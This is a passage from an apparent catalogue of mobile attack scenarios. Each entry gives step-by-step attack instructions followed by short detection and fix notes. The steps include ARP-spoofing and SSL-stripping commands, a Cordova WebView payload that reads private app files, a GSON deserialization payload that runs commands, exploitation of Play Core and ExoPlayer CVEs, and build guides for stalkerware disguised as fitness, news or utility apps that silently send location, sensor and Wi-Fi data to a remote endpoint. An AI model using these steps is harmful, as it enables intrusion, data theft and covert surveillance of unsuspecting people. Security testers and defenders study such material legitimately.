- **Attack Steps**: 1. Set up a mobile app or emulator that uses outdated TLS/OpenSSL (you can use an older Android APK or custom app with insecure networking libraries). 2. Make sure your test phone or emulator is connected to the same Wi-Fi network as your attacker machine. Use a hotspot or local Wi-Fi if testing at home. 3. On your Kali Linux (or attacker machine), install and launch Bettercap or mitmproxy. You can use: sudo bettercap -iface wlan0 or mitmproxy --mode transparent. 4. Enable IP forwarding and setup SSL stripping (automated in Bettercap with modules). This will allow intercepting HTTPS requests and downgrade to HTTP (if allowed). 5. Start scanning the network for connected devices: net.probe on in Bettercap. Identify your mobile device IP. 6. Launch ARP spoofing to redirect traffic from the mobile to your attacker machine: set arp.spoof.targets <victim-ip> then arp.spoof on. 7. Open the insecure mobile app (the one using outdated SSL) on the victim device. Perform a login or trigger some network request. 8. On your attacker machine, use Wireshark or Burp Suite to capture packets and analyze decrypted data. If SSL pinning is not enforced and outdated TLS (e.g., TLS 1.0 or 1.1) is accepted by the app, you will be able to view sensitive data. 9. (Optional) Use openssl s_client -connect <host>:443 -tls1 to test which old TLS protocols are supported. 10. You now demonstrate a full MITM interception due to outdated libraries. This proves that if an app does not validate certificates properly or uses vulnerable OpenSSL versions, attackers can break HTTPS and steal data.
- **Detection**: Use packet sniffers to inspect live traffic and identify plaintext credentials or outdated TLS versions. Use tools like testssl.sh or Burp's TLS scanner.
- **Solution**: Always update OpenSSL/TLS libraries. Enforce latest TLS (1.2 or 1.3). Use Certificate Pinning. Detect and reject SSL stripping and invalid certs.
- **Tags**: mitm, openssl, TLS downgrade, outdated SSL, android MITM, insecure transport

## Sensitive Data Exposure via Analytics SDK

- **Attack Type**: Data Leakage via Third-Party SDK
- **Target**: Mobile Apps (Android/iOS)
- **Vulnerability**: Insecure/Misconfigured Third-Party Analytics SDK
- **MITRE**: T1407 (Application Layer Protocol: Capture Data Sent to External Analytics Services)
- **Impact**: Privacy Violation, Legal Risk (e.g., GDPR breach), Identity Theft
- **Tools**: APKTool, JADX-GUI, Android Emulator, Wireshark, Burp Suite, mitmproxy, Frida
- **Scenario**: Many mobile apps use third-party analytics SDKs like Firebase, Flurry, Mixpanel, etc., for crash reporting, user tracking, and marketing. Sometimes, outdated or misconfigured SDKs accidentally capture sensitive data (e.g., email, name, location, token, health info) in logs, metadata, or network traffic. This becomes critical when SDKs send such data to external servers over HTTP or without encryption, leading to major privacy breaches. Attackers can exploit this by reverse engineering the app, inspecting the SDK behavior, or capturing traffic from the mobile device.
- **Attack Steps**: 1. Get the target APK of a mobile app that uses analytics SDKs. You can download an open-source APK or export one from your own device using adb pull /data/app/.... 2. Decompile the APK using JADX-GUI or APKTool: jadx-gui target.apk. Open the source code and look for imports like com.google.firebase.analytics.FirebaseAnalytics, com.flurry.sdk, com.mixpanel, etc. These indicate use of 3rd party analytics SDKs. 3. Carefully read through the onCreate(), onResume() or logEvent() functions. Apps often send parameters like user_email, location, phone, name, etc. directly via analytics event logs. These are clear privacy violations. 4. Now open an Android emulator or physical test phone and install the target APK. Set it to use your system proxy (Burp Suite or mitmproxy running on your PC). 5. In Burp Suite, enable SSL/TLS interception and install the Burp certificate on the Android device (Settings → Security → Install cert). Make sure app doesn’t use SSL Pinning. 6. Open the app and interact with it. Monitor Burp Suite’s HTTP history. Check if analytics SDKs are sending sensitive data to 3rd party domains (like firebase.io, flurry.com, api.mixpanel.com) in the form of query params or POST JSON. Look for values like name, email, password, or GPS location. 7. If you cannot intercept HTTPS traffic due to SSL pinning, bypass it using Frida. Run frida -U -n <app> -l frida-script.js where your script hooks into analytics methods or certificate validation functions to disable pinning. 8. Once you successfully intercept, save evidence where user data is being leaked via analytics SDK. 9. (Optional) Compare SDK versions and look up known issues (e.g., Firebase versions prior to 2020 were known to send unintentional identifiers). 10. This proves that by using outdated or insecure analytics SDKs, developers may unknowingly leak private user data over the network or logs, which attackers, advertisers, or bad SDK vendors can misuse.
- **Detection**: Use static and dynamic analysis to inspect app code, and monitor runtime traffic for suspicious outbound data to analytics domains. Use Burp, Wireshark, Frida.
- **Solution**: Avoid logging or tracking PII via analytics SDKs. Update SDKs regularly. Review data sent to third-party services. Use runtime security testing (RASP).
- **Tags**: sdk-leak, firebase, analytics, insecure third-party library, privacy leak, mobile data exposure

## WebView RCE via Third-Party Plugin (Cordova/Capacitor)

- **Attack Type**: Remote Code Execution (RCE) via Plugin Injection
- **Target**: Hybrid Mobile Apps (Android/iOS) using WebView
- **Vulnerability**: Outdated or Insecure Cordova/Capacitor Plugins Exposing Native Bridges
- **MITRE**: T1621 (Mobile - Execution via WebView)
- **Impact**: Remote Code Execution, File Read/Write, Device Takeover, App Compromise
- **Tools**: Android Studio, Cordova App (with vulnerable plugin), Frida, Burp Suite, Apktool, JADX, WebView Exploit HTML file, MITMproxy
- **Scenario**: Hybrid mobile apps (using frameworks like Apache Cordova, Ionic Capacitor, or PhoneGap) allow JavaScript-based app development using WebView. These frameworks use plugins to bridge native functionality (like file access, camera, etc.) to JavaScript. If outdated or misconfigured, plugins like cordova-plugin-inappbrowser, cordova-plugin-file, or cordova-plugin-customurlscheme can expose dangerous native features to attacker-controlled JavaScript via exec() or postMessage() functions. This can lead to full Remote Code Execution (RCE) via WebView. Attackers can inject malicious JavaScript into the WebView, and escalate it to native code using the plugin bridge.
- **Attack Steps**: 1. Download or build a Cordova-based Android APK using outdated plugins such as cordova-plugin-inappbrowser@1.7.2, cordova-plugin-file@6.0.1, or similar. You can use sample Cordova projects from GitHub for lab purposes. 2. Use JADX or Apktool to decompile the APK and inspect the plugin bridge. Look for exposed interfaces via addJavascriptInterface() or exec() method in CordovaWebViewImpl.java. 3. Check whether plugins expose unsafe native methods to JavaScript. For example, file path access, open external URL, or evaluate JavaScript from URL. 4. Open the APK in an Android emulator or physical test device. Set up a proxy (Burp or mitmproxy) on your PC and configure Android to use it. Install the Burp certificate on the emulator. 5. Create an attacker-controlled web page (e.g., evil.html) that includes malicious JavaScript code such as: <script>cordova.exec(function(){}, function(){}, 'File', 'readFile', ['file:///data/data/com.example.app/files/secret.txt']);</script>. This payload tries to use Cordova's plugin bridge to access native files. 6. Use any WebView loading function inside the app that opens untrusted URLs or allows deep linking to load your malicious evil.html page. If the app uses a vulnerable plugin and does not sanitize or limit WebView access, your script will execute. 7. Monitor the output using adb logcat, Frida, or JavaScript alert boxes to confirm payload execution. You can also hook Cordova methods using Frida to see which native functions are triggered. 8. In some vulnerable plugins, attackers can send postMessage() to the WebView and trigger native callbacks. Use: window.postMessage({action: 'readFile', path: '/data/data/...'}, '*'). 9. If successful, you can escalate to full file read, write, command execution, or intent triggering, depending on plugin permissions. 10. This completes the RCE chain: malicious JavaScript → vulnerable plugin → native access → RCE. This technique has been used in the wild (e.g., CVE-2019-12256, CVE-2017-3191 in Cordova).
- **Detection**: Reverse engineer APK to find JavaScript bridges. Test with malicious payloads via WebView or deep links. Use Frida to monitor native method calls.
- **Solution**: Update plugins regularly, disable unnecessary plugins, validate all URLs loaded in WebView, use CSP (Content Security Policy), avoid addJavascriptInterface unless sandboxed
- **Tags**: cordova, capacitor, rce, webview exploit, hybrid app, plugin vulnerability

## Crash / DoS via Glide / ImageView Bug

- **Attack Type**: Application Denial of Service (DoS) via Resource Exhaustion
- **Target**: Mobile Apps using Glide or ImageView
- **Vulnerability**: Glide Image Loader Memory Exhaustion, Corrupt Image Processing
- **MITRE**: T1499.001 (Endpoint DoS via Resource Exhaustion)
- **Impact**: App Crash, Unresponsive UI, Reboot Loop, Persistent Denial of Service
- **Tools**: Glide vulnerable version (pre-4.11), Android Emulator, Burp Suite, Custom HTTP server (like Python SimpleHTTPServer), GIMP or ImageMagick to generate large/corrupt images, Frida (optional), Logcat
- **Scenario**: Many Android apps use the Glide image loading library to efficiently display images from remote URLs. However, outdated versions of Glide (e.g., before v4.11) or misused ImageView implementations can cause crashes or ANRs (App Not Responding) when loading malicious image payloads. A very large image file (e.g., 8000x8000 pixels or more), a specially crafted corrupt image, or an endless redirect loop can lead to memory exhaustion or infinite processing loops, crashing the app instantly or freezing it permanently. This can be used for DoS attacks, crashing the app every time it opens or even triggering a reboot loop in some cases.
- **Attack Steps**: 1. Identify or build a test Android app that uses an outdated version of Glide (example: Glide v4.8 or earlier). You can search GitHub for old open-source Android projects using Glide for image loading inside ImageView. 2. Open the source code or APK and confirm that Glide is used to load image URLs, e.g., Glide.with(context).load("http://example.com/image.jpg").into(imageView); 3. Set up an Android emulator and install the test app. 4. Set up your own HTTP server to serve image payloads. You can do this by running python3 -m http.server 8000 in a folder containing a large image. 5. Use GIMP, Photoshop, or ImageMagick to create a very large image file. For example, 10000x10000 PNG with transparency or a corrupt header. Alternatively, use an infinite redirect by hosting a .htaccess or using Flask to keep redirecting the image URL. 6. Replace the image URL in the app’s code or trigger the app to fetch your malicious image using Burp Suite request modification, if the app loads user content. 7. As soon as the app loads your malicious image, it will begin consuming excessive memory. Glide will attempt to decode it fully into memory, resulting in OutOfMemoryError or a crash. 8. Monitor the crash using adb logcat and confirm errors like: java.lang.OutOfMemoryError: Failed to allocate a 500000000-byte allocation with 67108864 free bytes. 9. Repeat the launch — if the image loads automatically on app startup (e.g., as profile picture), the app will crash again instantly, leading to a persistent DoS condition. 10. You have now successfully demonstrated a real-world DoS attack using Glide image rendering weakness — particularly dangerous in chat apps or social apps where users can control image sources. This type of vulnerability has been reported in apps like WhatsApp clones, older Instagram clients, and unmaintained social media apps.
- **Detection**: Monitor logcat output for OutOfMemoryError, ANR traces, or rendering failures. Use Burp to identify if large images are being fetched.
- **Solution**: Upgrade to Glide ≥ 4.11, validate image size and content before loading, apply fallback images, set memory/caching limits in Glide config, sanitize and resize user-uploaded images
- **Tags**: glide, imageview, android crash, dos, memory exhaustion, large image attack

## GSON Deserialization RCE

- **Attack Type**: Remote Code Execution (RCE) via Insecure Deserialization
- **Target**: Mobile Apps using GSON for JSON Parsing
- **Vulnerability**: Insecure Deserialization via GSON TypeToken or Polymorphic Objects
- **MITRE**: T1606.001 (Execution via Deserialization - Android)
- **Impact**: Remote Code Execution, App Crash, Privilege Escalation, Full Device Compromise
- **Tools**: Android Emulator, Burp Suite, Frida, JADX, GSON vulnerable version (≤2.8.8), ysoserial-for-android, Logcat, Custom APK with JSON API or WebView bridge
- **Scenario**: GSON is a widely used Java/Android library for converting JSON into Java objects. In older or misconfigured versions (especially before v2.8.9), if an app deserializes untrusted JSON into generic Object types (e.g., TypeToken<Object>), or allows polymorphic deserialization using attacker-controlled types, it can result in RCE. Attackers can send specially crafted JSON payloads that force GSON to instantiate dangerous gadget classes (e.g., from the app itself or from included libraries like Apache Commons), eventually leading to execution of arbitrary code. This is particularly dangerous in mobile apps with API endpoints or local WebView bridges that accept JSON and parse them using GSON without strict type enforcement.
- **Attack Steps**: 1. Identify a mobile app that uses GSON and accepts JSON input from the user. This could be via a WebView bridge, local API endpoint, or server call that sends JSON data. You can search GitHub for older Android projects using GSON 2.8.5, 2.8.6, or 2.8.8. 2. Use JADX to decompile the APK and look for JSON parsing code like: Gson.fromJson(input, Object.class) or fromJson(json, TypeToken.getParameterized(List.class, Object.class).getType()). If the type is generic or not tightly enforced, it’s vulnerable. 3. Set up the app on an Android emulator and configure it to use Burp Suite as proxy. Install the Burp certificate. 4. Find an endpoint or input field that allows you to inject JSON. This could be a login screen, config loader, or in-app web page sending JSON via JS bridge. 5. Build a malicious JSON payload using a gadget chain available in the app. For test purposes, you can build a dummy app that includes a vulnerable gadget class like: public class EvilClass { static { Runtime.getRuntime().exec("reboot"); } } or System.exit(1);. 6. Use a tool like ysoserial-for-android or manually craft a payload like: {"@type":"your.package.EvilClass"}. This tells GSON to instantiate EvilClass on deserialization. 7. Send this JSON to the target input using Burp or Frida script if it’s a local call. GSON will deserialize it and execute the static block or constructor, leading to command execution. 8. Use adb logcat to monitor the result. You will see crash logs, system exit, or execution traces. This proves RCE occurred through deserialization. 9. You can also write a harmless payload that logs a message or opens calculator to prove code execution safely. 10. This demonstrates a full RCE chain from JSON input → vulnerable GSON fromJson() → instantiating malicious class → code execution. GSON versions ≤2.8.8 do not enforce strict class loading rules, which allows attackers to abuse this behavior.
- **Detection**: Use static analysis to detect generic deserialization (Object.class). Dynamically test inputs using Frida or Burp. Logcat shows if code is executed on deserialization.
- **Solution**: Upgrade to GSON ≥2.8.9 which disables unsafe polymorphism by default. Never deserialize user input into generic Object. Whitelist allowed types explicitly.
- **Tags**: gson, deserialization, insecure object parsing, android rce, json attack, outdated sdk

## Exposure to Known CVEs in PlayCore, ExoPlayer, Firebase

- **Attack Type**: Exploitation via Known Vulnerable SDK Versions
- **Target**: Android Apps Using Google SDKs (Play Core, ExoPlayer, Firebase)
- **Vulnerability**: Known CVEs in Google Libraries due to Outdated Versions
- **MITRE**: T1606 (Exploitation via Known Vulnerabilities in Third-Party Components)
- **Impact**: Remote Code Execution, File Read, Data Leakage, App Crash
- **Tools**: JADX, ApkTool, Android Emulator, Frida, Burp Suite, CVE PoC Code (GitHub), Logcat, PlayCore exploit demo app
- **Scenario**: Android apps often use Google libraries such as Play Core (used for dynamic feature delivery), ExoPlayer (for video streaming), and Firebase (for analytics, authentication, etc.). Many versions of these libraries have publicly known security vulnerabilities (CVEs). Developers using outdated versions may unknowingly expose apps to privilege escalation, RCE, local file leakage, or denial-of-service attacks. For example, CVE-2020-8913 in Play Core allowed attackers to load arbitrary code from untrusted sources, and CVE-2021-0339 in ExoPlayer allowed memory corruption. These CVEs can be exploited by reverse engineering the app, checking SDK versions, and crafting malicious payloads or using attacker-controlled apps that exploit IPC or intent misconfigurations.
- **Attack Steps**: 1. Identify or download a target APK that uses one or more of the vulnerable libraries: Play Core (com.google.android.play:core), ExoPlayer (com.google.android.exoplayer:exoplayer), or Firebase. These are common in many open-source Android apps (search GitHub). 2. Use JADX or ApkTool to decompile the APK and search for exact versions used. In JADX, open the build.gradle file or inspect META-INF for version identifiers. Example vulnerable versions: Play Core ≤1.7.2 (CVE-2020-8913), ExoPlayer ≤2.11.7 (CVE-2021-0339), Firebase Analytics pre-2022 (data leaks). 3. Confirm usage of the vulnerable components. For Play Core, look for SplitInstallManager, SplitInstallRequest. For ExoPlayer, look for SimpleExoPlayer, TrackSelector, etc. 4. For CVE-2020-8913 (Play Core): Build or use a malicious app that shares the same UID or target device with the victim app (via adb or dual app methods). Inject a fake dynamic module into /data/local/tmp/fakeModule.apk. Then trick the vulnerable app into loading it via SplitInstallManager. The vulnerable app does not validate source. When it installs and runs the code, it leads to RCE. 5. For CVE-2021-0339 (ExoPlayer): Create a malformed media file (e.g., MKV or MP4) with crafted metadata using ffmpeg or download PoC from GitHub. Host the file on a local HTTP server (python3 -m http.server) and load it inside the ExoPlayer-enabled app. The app may crash or trigger memory corruption. 6. For Firebase CVEs (data leakage): Install the app on an emulator, configure Burp Suite with HTTPS interception. Use the app and monitor outbound traffic to Firebase Analytics (firebaseinstallations.googleapis.com, app-measurement.com). Check for exposure of sensitive fields such as full name, phone, email, or tokens in unencrypted or improperly anonymized formats. 7. Use adb logcat to monitor crashes, exploit output, or stack traces. You may see RCE execution, buffer overflows, app crashes, or leaked tokens. 8. Confirm successful exploitation of the CVE by correlating with PoC expected behavior (e.g., gaining shell access, app crashing on video load, sensitive data exfiltration). 9. These CVEs are dangerous because they can be exploited remotely (ExoPlayer, Firebase) or locally (Play Core) and are often overlooked in mobile apps that don’t regularly update dependencies.
- **Detection**: Reverse engineering (JADX/ApkTool), CVE version checking, Logcat crash output, network traffic analysis (Burp)
- **Solution**: Always update Google Play Core, ExoPlayer, Firebase to latest versions. Monitor CVE databases (like NVD) and GitHub security advisories. Validate file formats before media loading. Block untrusted dynamic modules.
- **Tags**: cve, playcore, exoplayer, firebase, sdk vulnerability, outdated libraries, android rce

## Abuse of ACCESS_BACKGROUND_LOCATION on Android

- **Attack Type**: Privacy Violation / Stealth Location Tracking
- **Target**: Android Application
- **Vulnerability**: Over-permission Abuse (ACCESS_BACKGROUND_LOCATION)
- **MITRE**: T1614 - System Location Discovery
- **Impact**: Users are tracked without consent even when app is not in use, leading to surveillance, stalking, and privacy invasion
- **Tools**: Android Studio, Genymotion or Android Emulator, Burp Suite, Custom Malicious App (built using Java/Kotlin), MITM Proxy, Online IP Logger (e.g., webhook.site)
- **Scenario**: An Android application requests ACCESS_BACKGROUND_LOCATION permission to collect user location data even when the app is not actively in use. This permission is abused to secretly track users in the background without their informed consent. The attacker embeds this in a fake utility app (like a flashlight or wallpaper app). Once the user grants permission, their location is logged silently and periodically to a remote server.
- **Attack Steps**: Step 1: Install Android Studio and set up a basic Android project. Select “Empty Activity” and name it “LocationTrackerApp”.Step 2: Add the following permissions in the AndroidManifest.xml: <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>, <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>, <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>, <uses-permission android:name="android.permission.INTERNET"/>.Step 3: Design a simple UI (e.g., “Tap to Activate”) to make the app look innocent, like a utility tool.Step 4: Implement a LocationService.java or LocationService.kt that runs in the background. Use FusedLocationProviderClient to fetch location periodically using LocationRequest.setInterval().Step 5: In the service class, fetch the user’s latitude and longitude in the background and send this data to a malicious webhook (e.g., https://webhook.site/xyz) using HttpURLConnection or Retrofit.Step 6: Use WorkManager or ForegroundService to run this service even when the app is closed, especially for Android 10 and 11 where background location access is restricted by default UI prompts.Step 7: Sign and build the APK. Install it in an Android emulator or Genymotion device.Step 8: Open the app and grant all permissions manually via prompt or via ADB command: adb shell pm grant com.example.locationapp android.permission.ACCESS_BACKGROUND_LOCATION.Step 9: Minimize the app or lock the phone. Wait for 5–10 minutes.Step 10: Open your webhook.site or IP logger and check — the victim’s location coordinates (longitude/latitude) are being sent silently in the background without any user interaction.Step 11: This means the app is successfully abusing background location access. You can further send this data to a personal server, track users' movements, or geofence their behavior.
- **Detection**: Perform dynamic analysis of app behavior using tools like Frida, Xposed, or Burp Suite to monitor network calls. Monitor permission usage logs and service behavior using adb logcat.
- **Solution**: Always review app permission requests carefully. On Android 10+, restrict background location access unless truly needed. Monitor apps via permission manager. Use Android 12+ privacy indicators and permission usage reports.
- **Tags**: ACCESS_BACKGROUND_LOCATION, Location Tracking, Android Privacy Abuse, Background Service Exploit, Mobile Surveillance, Privacy Violation, MITRE T1614

## Using Foreground Services to Mask Location Collection

- **Attack Type**: Stealth Location Tracking via Legitimate Features
- **Target**: Android App
- **Vulnerability**: Abuse of Foreground Service and Location APIs
- **MITRE**: T1614 - System Location Discovery
- **Impact**: Silent, persistent tracking of user’s real-world movements. User is unaware their GPS location is being shared continuously in real-time to attacker-controlled servers.
- **Tools**: Android Studio, Burp Suite or webhook.site, Android Emulator or Genymotion, Java/Kotlin knowledge (basic), Android device (optional), ADB
- **Scenario**: A malicious Android app uses a Foreground Service to hide the fact that it's collecting the user's location in real-time. Foreground services appear legitimate to Android (e.g., displaying a media player or fitness tracking), so they bypass many background location restrictions. This attack tricks the user into thinking the app is doing something helpful (like step tracking or music playing) while secretly collecting and sending GPS data to a remote server or attacker-controlled endpoint.
- **Attack Steps**: Step 1: Install Android Studio and create a new project called “FitnessTrackerApp” (this is a dummy name to fool users). Choose "Empty Activity" as the template and click Finish.Step 2: In your AndroidManifest.xml, add the following permissions: <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>, <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>, <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>, <uses-permission android:name="android.permission.INTERNET"/>.Step 3: Design a basic UI with one button saying "Start Tracking" (to look like a real fitness app). When the user taps this button, your app will start a foreground service.Step 4: Create a Java/Kotlin service class, e.g., LocationForegroundService. Inside this service, use FusedLocationProviderClient to request location updates with high accuracy.Step 5: Add a notification to run this service in foreground using startForeground(NOTIFICATION_ID, notification). Make the notification say something innocent like “Fitness tracking running…” so users aren’t suspicious.Step 6: Inside the location callback, log the user's current location (latitude and longitude), and send it to a remote endpoint using HttpURLConnection, Volley, or Retrofit. You can use webhook.site to view captured data live.Step 7: Build and run the app on your emulator or real device. Tap “Start Tracking”. A foreground notification will appear, but the user thinks it’s for step or activity tracking.Step 8: In reality, every few seconds the app is collecting and sending location data even if the app is in the background or screen is off. Android won't kill the service because it's marked as Foreground and has a persistent notification.Step 9: Go to webhook.site and verify — your device’s GPS data is being sent continuously without the user being aware it’s being misused.Step 10: Now lock the screen or switch apps — the service keeps running, continuing to track the user without them ever reopening the app. It bypasses Android's background location restrictions because Foreground Services are treated as legit use-cases.Step 11: This is a fully functional location tracker masked behind an innocent-looking foreground service — commonly used in malicious apps like fake fitness, battery optimizers, or wallpapers. You’ve now completed the full abuse simulation.
- **Detection**: Check for any suspicious apps with “always-on” notifications that don’t match functionality (e.g., music app without sound, step tracker without sensors). Monitor traffic via Burp Suite, Wireshark, or adb logcat. Use privacy dashboards in Android 12+ to monitor which apps access location frequently.
- **Solution**: Don’t install apps from unknown sources. Restrict location permissions to “Only while using the app” wherever possible. Check if the notification from the app is legitimate. On Android 12+, check privacy indicators and permission usage reports. Developers should be transparent when using location in foreground services.
- **Tags**: ACCESS_FINE_LOCATION, Foreground Service Abuse, Privacy Leak, Stealth GPS Tracking, Mobile Spy App, Android Foreground Location Exploit, MITRE T1614

## Third-Party SDKs Collecting Location Without Transparency

- **Attack Type**: Supply Chain / Covert Location Tracking
- **Target**: Android App
- **Vulnerability**: Hidden Location Harvesting via 3rd-Party SDK
- **MITRE**: T1602 - Data from Local System / T1614 - System Location Discovery
- **Impact**: Silent, continuous tracking of user location without user awareness or direct developer implementation. Exploits user trust in app and bypasses OS-level expectations of transparency.
- **Tools**: Android Studio, Android Emulator, Burp Suite or Wireshark, Mock Location Generator App, ADB, Open-source SDK sample (like OpenAdSDK, MoPub, AirPush, or self-made test SDK), webhook.site
- **Scenario**: In this scenario, a seemingly harmless mobile app integrates a third-party SDK (Software Development Kit) from an analytics or ad network. This SDK silently collects the user’s precise GPS location even when the app is not being used, and sends it to external servers. The app developer may not be aware of the SDK's full data behavior, or may include it knowingly for monetization. This is a supply chain privacy abuse because the app itself doesn’t directly request or use location data — the third-party SDK inside it does.
- **Attack Steps**: Step 1: Open Android Studio and create a new project called InnocentNewsApp. Select Empty Activity and click Finish. This app will simulate a simple news reader, which should have no need to access location.Step 2: Add the following permissions in AndroidManifest.xml: <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>, <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>, <uses-permission android:name="android.permission.INTERNET"/>.Step 3: In the build.gradle, simulate adding a third-party SDK by including a custom SDK module or dependency. If using a self-created SDK module, call it analytics-sdk.Step 4: Inside your SDK code (or simulate an SDK class inside the app), create a class StealthLocationCollector.java. In that class, initialize FusedLocationProviderClient and configure it to fetch high-accuracy GPS coordinates in the background.Step 5: Add a method inside the SDK like startDataCollection(Context context) that fetches the device location silently and sends it to an attacker-controlled server using HttpURLConnection or Retrofit. Use webhook.site to view the requests live. The app will not visibly use this SDK or show anything on the UI.Step 6: In your app’s MainActivity.java, initialize the SDK in the onCreate() method using: StealthLocationCollector.startDataCollection(this);. This ensures it starts silently on app launch.Step 7: Build and install the app on an emulator. Accept all location permissions when prompted (users often do this without reading carefully).Step 8: Run the app. It shows a basic UI like “Welcome to Daily News” — looks safe and harmless. In the background, the SDK starts collecting and sending real-time GPS data every few seconds to your webhook.site or server.Step 9: Open your webhook.site tab and observe — your emulator/device location data (lat/lon) is being sent silently.Step 10: Now close the app or put the emulator in background. If you’ve used a background service inside the SDK (like WorkManager), location will still be sent. No indication is shown to the user, and the app UI never used any maps or location features. This confirms the SDK is doing hidden tracking.Step 11: This is how many real-world free apps (e.g., flashlight, wallpaper, horoscope, or free VPNs) integrate hidden SDKs that monetize user location via ad companies. Most users and even developers are unaware of how aggressively these SDKs behave.Step 12: You’ve now successfully simulated third-party SDK-based hidden location tracking. This completes the real-world attack lab scenario.
- **Detection**: Use Burp Suite or adb logcat to inspect outgoing requests. Look for suspicious background network traffic to unknown domains. Analyze installed app packages for obfuscated SDKs. Use tools like Exodus Privacy Scanner or ClassyShark to inspect APK contents.
- **Solution**: Use SDKs from trusted sources only. Conduct static and dynamic audits on all SDKs used. Request only needed permissions. Implement runtime permission prompts that clearly inform users of location use. Android 12+ users should review Privacy Dashboard to monitor abuse.
- **Tags**: Third-Party SDK, Location Tracking, Hidden Analytics, Covert Data Collection, Supply Chain Risk, Android App Privacy, MITRE T1614

## Abusing Motion Sensors to Approximate Location

- **Attack Type**: Covert Location Inference
- **Target**: Android App
- **Vulnerability**: Location Inference Without Location Permissions
- **MITRE**: T1614 - System Location Discovery
- **Impact**: Motion sensors can silently track physical movements and infer approximate geographic location. Can be used to identify routines, travel paths, or nearby locations without GPS or Wi-Fi.
- **Tools**: Android Studio, Android Emulator or Physical Android Device with Motion Sensors, Python or Java (for optional post-processing), Webhook.site or Remote Server, Sensor Data Logger Code
- **Scenario**: In this scenario, a malicious Android app avoids asking for any location-related permissions like GPS, Wi-Fi, or background location. Instead, it uses access to motion sensors — such as the accelerometer, gyroscope, and magnetometer — which are considered “non-dangerous permissions” and don't require user consent. These sensors provide very sensitive data about user movements, orientation, and speed. When collected over time, this data can be processed to estimate a user’s path and geographical location. Some attackers combine this with known maps, road networks, or public Wi-Fi SSIDs to accurately track a user without ever accessing GPS. This technique has been proven in academic research and can be implemented in real-world Android malware.
- **Attack Steps**: Step 1: Open Android Studio and create a new Android project named SensorTrackDemo. Select “Empty Activity” and click Finish.Step 2: In the AndroidManifest.xml, DO NOT request any location-related permissions. Just add <uses-permission android:name="android.permission.INTERNET"/> if you plan to send data to a remote server.Step 3: In MainActivity.java or MainActivity.kt, initialize access to the motion sensors: use SensorManager to register listeners for TYPE_ACCELEROMETER, TYPE_GYROSCOPE, and TYPE_MAGNETIC_FIELD.Step 4: Set up a SensorEventListener and record the X, Y, and Z values from each sensor as they change. You’ll be logging raw movement, rotation, and directional data.Step 5: Store these values in an internal buffer or list every few milliseconds. Optionally, timestamp each entry so you can align them later for analysis.Step 6: Write a simple routine that runs in a background thread or using Handler to periodically send the collected sensor data to a server (e.g., webhook.site or your Flask backend). Use Retrofit or plain HttpURLConnection to POST the data in JSON format.Step 7: Build and run the app on a physical Android device. Walk around a room, house, or neighborhood while the app is running in foreground or background.Step 8: The app continuously collects movement data like tilt, speed, and direction. Open your webhook.site or server logs — you will see the movement data being transmitted without the app having any GPS permissions.Step 9: Now, analyze the collected data offline using a script or plotting tool. The pattern of acceleration, rotation, and orientation gives insights into user movement patterns — like turns, stops, steps, and even direction faced.Step 10: With enough data and known starting point (e.g., if user opened app in a certain place like a mall), you can combine sensor data with known map patterns or even public Wi-Fi SSID scans (if app has Wi-Fi permissions) to infer approximate location with reasonable accuracy.Step 11: You've now successfully simulated a real-world attack that circumvents Android location permissions and silently tracks user movement using motion sensors only. This technique is extremely stealthy and hard to detect since Android does not notify users about sensor access.Step 12: In real-world malicious apps (e.g., fake fitness apps, compasses, or games), this technique is used to build user behavioral profiles, infer visited locations, and sell location data to third parties without triggering permission alerts.
- **Detection**: Use static analysis to detect abnormal access to motion sensors. Monitor sensor usage patterns in apps using tools like Frida, Xposed, or Android Profiler. Android 12+ also shows sensor usage indicators.
- **Solution**: Restrict unnecessary sensor access unless app functionality truly needs it. Android developers should not collect motion sensor data in background without purpose. Android OS should notify users about ongoing sensor use (introduced in Android 12+). Users should prefer apps from trusted developers only.
- **Tags**: Motion Sensor Abuse, Accelerometer Tracking, Sensor Spy App, Background Movement Logging, Location Without GPS, Mobile Privacy Abuse, MITRE T1614

## Bluetooth Beacons or Wi-Fi SSID Logging

- **Attack Type**: Passive Location Tracking Without GPS
- **Target**: Android App
- **Vulnerability**: Radio Signal-Based Location Tracking
- **MITRE**: T1614 - System Location Discovery
- **Impact**: Users’ precise location is inferred passively using surrounding Wi-Fi or Bluetooth data, even when GPS is off. This breaches privacy and enables long-term tracking.
- **Tools**: Android Studio, Android Emulator (or physical Android device with Wi-Fi/Bluetooth), Webhook.site or Flask Server, Burp Suite or MITM Proxy (optional), Python (for post-processing lookups), WiGLE.net (SSID-to-location service), Bluetooth Scanner (optional), ADB
- **Scenario**: In this attack, a malicious mobile application collects environmental signals (nearby Bluetooth Low Energy (BLE) beacons and Wi-Fi SSID names). These identifiers are often location-specific (e.g., “Starbucks_123” or “Office_WIFI_2F”), so collecting them allows an attacker to infer the user’s current location, even when location permissions like GPS are not granted. Since scanning for Bluetooth and Wi-Fi is possible without fine-grained location permissions on many Android versions, users may never know their location is being monitored. Attackers can compare scanned SSIDs against known public or commercial location databases (like Google’s or Apple’s) to get GPS coordinates.
- **Attack Steps**: Step 1: Open Android Studio and create a new project called SilentLocatorApp. Use the "Empty Activity" template and click Finish. This app will simulate a basic tool like “Battery Optimizer” to hide its real purpose.Step 2: In AndroidManifest.xml, add the following permissions: <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>, <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>, <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>, <uses-permission android:name="android.permission.BLUETOOTH"/>, <uses-permission android:name="android.permission.BLUETOOTH_ADMIN"/>, <uses-permission android:name="android.permission.BLUETOOTH_SCAN" tools:ignore="MissingPermission"/>, <uses-permission android:name="android.permission.INTERNET"/>.Step 3: In your MainActivity.java or MainActivity.kt, initialize the WifiManager and BluetoothAdapter to scan nearby networks and Bluetooth devices. Also use ContextCompat.checkSelfPermission() to silently request permission at runtime (for Android 10+).Step 4: For Wi-Fi scanning, use wifiManager.startScan() and fetch SSIDs using wifiManager.getScanResults().
